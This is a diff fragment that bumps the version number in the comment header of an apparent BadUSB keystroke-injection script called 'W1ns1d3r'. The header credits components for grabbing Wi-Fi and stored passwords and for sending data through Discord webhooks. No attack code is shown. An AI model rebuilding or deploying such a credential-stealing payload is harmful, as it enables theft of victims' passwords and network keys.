@@ -1,6 +1,6 @@
 REM Title: W1ns1d3r
 REM Author: Kali-Gvte (https://github.com/Gvte-Kali/BadStuffHosting/tree/main/W1ns1d3r)
-REM Version: 2.0
+REM Version: 2.1
 REM Credit Discord webhooks functions :I-am-jakoby
 REM Credit Wifi grabber : 7h30th3r0n3 and the0bone
 REM Credit Password Nirsoft : moosehadley
